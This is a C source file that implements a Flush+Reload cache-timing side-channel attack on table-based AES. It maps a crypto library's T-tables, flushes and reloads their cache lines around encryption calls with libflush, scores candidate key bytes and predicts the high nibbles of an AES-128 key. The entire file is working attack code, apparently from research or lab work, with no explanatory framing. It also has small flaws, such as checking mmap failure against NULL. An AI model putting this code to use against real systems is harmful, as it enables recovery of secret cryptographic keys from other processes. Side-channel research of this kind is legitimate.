#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "one_round.h"


// Convert string to hex
static void string_to_hex(unsigned char *pIn, unsigned int pInLen, unsigned char *pOut) {
    unsigned int i, j;
    unsigned int mul;
    char data = 0;

    for(i=0, j=0; i<pInLen; i++) {
        if(i % 2 == 0)
            mul = 16;
        else
            mul = 1;

        if(pIn[i] >= '0' && pIn[i] <= '9')
            data += ((pIn[i] - 48) * mul);
        else if(pIn[i] >= 'a' && pIn[i] <= 'f')
            data += ((pIn[i] - 87) * mul);
        else if(pIn[i] >= 'A' && pIn[i] <= 'F')
            data += ((pIn[i] - 55) * mul);
        else
            return;

        if(mul == 1)
        {
            pOut[j] = data;
            data = 0;
            j++;
        }
    }
}

 
// Map crypto library
static int map_crypto_library(struct one_round_attack_ctx *ctx) {
	struct stat filestat;
	struct one_round_attack_args *args = &ctx->args;
	struct one_round_attack_cache_ctx *cache_ctx = &ctx->cache_ctx;
	
	// Open file
	cache_ctx->crypto_lib_fd = open(args->crypto_lib, O_RDONLY);
	if (cache_ctx->crypto_lib_fd == -1) {
		perror("[aeslib]: Could not open crypto file");
		return -1;
	}
	
    if (fstat(cache_ctx->crypto_lib_fd, &filestat) == -1) {
		perror("[aeslib]: Could not obtain file information.");
		close(cache_ctx->crypto_lib_fd);
	    return -1;

    }
	
	cache_ctx->crypto_lib_size = filestat.st_size;
	cache_ctx->crypto_lib_addr = (unsigned char*)mmap(0, cache_ctx->crypto_lib_size, PROT_READ, MAP_SHARED, cache_ctx->crypto_lib_fd, 0);
	if (cache_ctx->crypto_lib_addr == NULL) {
		perror("[aeslib]: Could not map file");
		return -1;
	}
	
	cache_ctx->state_te0 = (unsigned int*)(cache_ctx->crypto_lib_addr + args->off_te0);
	cache_ctx->state_te1 = (unsigned int*)(cache_ctx->crypto_lib_addr + args->off_te1);
	cache_ctx->state_te2 = (unsigned int*)(cache_ctx->crypto_lib_addr + args->off_te2);
	cache_ctx->state_te3 = (unsigned int*)(cache_ctx->crypto_lib_addr + args->off_te3);
	
	return 0;
}

static void unmap_crypto_library(struct one_round_attack_ctx *ctx) {
	struct one_round_attack_cache_ctx *cache_ctx = &ctx->cache_ctx; 	
	if (munmap(cache_ctx->crypto_lib_addr, cache_ctx->crypto_lib_size) == -1) {
		perror("[aeslib]: Munmap error");
	}
	if (close(cache_ctx->crypto_lib_fd) == -1) {
		perror("[aeslib]: Close error");
	}
}

static int read_plains(struct one_round_attack_ctx *ctx) {
	FILE *fp = NULL;
	unsigned char tmp[33] = {0,};
	int plain_text_cnt;

    printf("%s\n", ctx->args.plaintext_file);
	fp = fopen(ctx->args.plaintext_file, "r");
	if (!fp) {
        perror("[aeslib]: Could not open plain text file");
		return -1;
	}
	
	fscanf(fp, "%d\n", &plain_text_cnt);
	if (plain_text_cnt > ctx->args.plain_text_cnt)
		plain_text_cnt = ctx->args.plain_text_cnt;
	
	printf("[aeslib]: Plain text count : %d\n", plain_text_cnt);
	
	for (int i = 0; i < plain_text_cnt; i++) {
		memset(tmp, 0, sizeof(tmp));
		fscanf(fp, "%s\n", tmp);
		
		if (strlen((const char *)tmp) != 32) {
			perror("Plain text error");
			return -1;
		}
		
		string_to_hex(tmp, strlen((const char *)tmp), ctx->cache_ctx.plains[i]);
	}
	fclose(fp);
	
	return 0;
}

static void init_arrays(struct one_round_attack_ctx *ctx) {
	int p, ki;
	unsigned int kbyte;
	struct one_round_attack_cache_ctx *cache_ctx = &ctx->cache_ctx;
	
	for(p = 0; p < MAX_PLAIN_TEXTS; p++) {	
		for (ki = 0; ki < AES128_KEY_LEN; ki++) {
			for (kbyte = 0; kbyte < KEYBYTES; kbyte+=16) {
				cache_ctx->subset[p][ki][kbyte] = 0.0;
				cache_ctx->score[ki][kbyte] = 0.0;
			}
		}
	}
}

static int cache_ctx_init(struct one_round_attack_ctx *ctx) {
	int r;
	
	// Map libcrypto
	r = map_crypto_library(ctx);
	if (r)
		return r;
	
	// Initialize libflush
	libflush_init(&(ctx->cache_ctx.libflush_session), NULL);
	
	// Read random plaintext
	r = read_plains(ctx);
	if (r)
		return r;
	
	// Init arrays
	init_arrays(ctx);
	
	return 0;
}


 
 
// Attack functions
static void *get_check_addr(int te, int x, struct one_round_attack_ctx *ctx) {
	void *addr = NULL;
	
	if (te == 0)		addr = ctx->cache_ctx.state_te0;
	else if (te == 1)	addr = ctx->cache_ctx.state_te1;
	else if (te == 2)	addr = ctx->cache_ctx.state_te2;
	else if (te == 3)	addr = ctx->cache_ctx.state_te3;
	addr = ((unsigned int*)(addr) + x);	
	return addr;
}
 
static inline int reload_and_is_useful(struct libflush_session_t *session, void *addr, int threshold) {
	uint64_t count;
	count = libflush_reload_addr(session, addr);
	if(count < threshold)
		return 1;
	return 0;
}

static inline void flush_te(struct libflush_session_t *session, void *addr)
{
	libflush_flush(session, addr);
}

static void calc_subset(struct one_round_attack_ctx *ctx) {
	unsigned char enc[16] = {0,};
	int p, ki, r, te, x;
	unsigned int kbyte, sum, total, curr;
	void *addr;
	
	int word_cnt = ctx->args.cache_line_size / sizeof(unsigned int);
	int repeat_cnt = ctx->args.cache_attack_repeat_cnt;
	int plain_text_cnt = ctx->args.plain_text_cnt;
	int threshold = ctx->args.cpu_cycle_threshold;
	struct one_round_attack_cache_ctx *cache_ctx = &ctx->cache_ctx;
	
	printf("[aeslib]: Calculating all subsets...\n");
	total = plain_text_cnt * AES128_KEY_LEN * KEYBYTES * repeat_cnt;
	
	for (p = 0; p < plain_text_cnt; p++) {		
		for (ki = 0; ki < AES128_KEY_LEN; ki++) {		
			for (kbyte = 0; kbyte < KEYBYTES; kbyte++) {
				if (ki == 0 && kbyte % word_cnt != 0)	/* skip for first ki only */
					continue;
				
				// get ideal one-round-after access 
				te = ki % 4;
				x = (cache_ctx->plains[p][ki]) ^ (kbyte);
				addr = get_check_addr(te, x, ctx);
				
				sum = 0;
				for (r = 0; r<repeat_cnt; r++) {	
					// Flush 
					flush_te(cache_ctx->libflush_session, addr);
					
					// get real full-round-after access. It means real-encryption process. */
					ctx->encrypt(cache_ctx->plains[p], enc, sizeof(enc));
					
					// reload, and check whether its useful
					sum += reload_and_is_useful(cache_ctx->libflush_session, addr, threshold);
				}
				
				cache_ctx->subset[p][ki][kbyte] = ((double)sum / (double)(repeat_cnt));
			}
		}
		
		curr = (p * AES128_KEY_LEN * KEYBYTES * repeat_cnt);
		curr += (ki * KEYBYTES * repeat_cnt);
		printf("Progress : %d / %d\n", curr, total);
	}
}

// Calculate score
static void calc_score(struct one_round_attack_ctx *ctx) {
	int p, ki;
	unsigned int kbyte, row;
	
	int word_cnt = ctx->args.cache_line_size / sizeof(unsigned int);
	int plain_text_cnt = ctx->args.plain_text_cnt;
	struct one_round_attack_cache_ctx *cache_ctx = &ctx->cache_ctx;
	
	for (p = 0; p < plain_text_cnt; p++) {		
		for (ki = 0; ki < AES128_KEY_LEN; ki++) {
			for (kbyte = 0; kbyte < KEYBYTES; kbyte+=word_cnt) { /* choose high nibble only, It's because of limitation of cache line size */
				for (row = 0; row < word_cnt; row++) {
					cache_ctx->score[ki][kbyte] += cache_ctx->subset[p][ki][kbyte+row];
				}
			}
		}
	}
}

// Predict real key
static void predict_key(struct one_round_attack_ctx *ctx) {
	int ki;
	unsigned int kbyte, best;
	double max = -1.0;
	
	int word_cnt = ctx->args.cache_line_size / sizeof(unsigned int);
	unsigned char *out_key = ctx->result.predict_key;
	struct one_round_attack_cache_ctx *cache_ctx = &ctx->cache_ctx;
	
	for (ki = 0; ki < AES128_KEY_LEN; ki++) {
		max = -1.0;
		
		for (kbyte = 0; kbyte < KEYBYTES; kbyte += word_cnt) { /* choose high nibble only, It's because of limitation of cache line size */
			if(cache_ctx->score[ki][kbyte] > max) {
				max = cache_ctx->score[ki][kbyte];
				best = kbyte;
			}
		}
		
		out_key[ki] = best;
	}
}



// Exported functions
int one_round_attack_init(struct one_round_attack_ctx *ctx) {
	memset(&ctx->result, 0, sizeof(ctx->result));
	return cache_ctx_init(ctx);
}

void one_round_attack_do_attack(struct one_round_attack_ctx *ctx) {
	// Calculate subsets.
	calc_subset(ctx);
	
	// Calculate score
	calc_score(ctx);
	
	// Predict key 
	predict_key(ctx);
}

void one_round_attack_finalize(struct one_round_attack_ctx *ctx)
{
	libflush_terminate(ctx->cache_ctx.libflush_session);
	unmap_crypto_library(ctx);
}
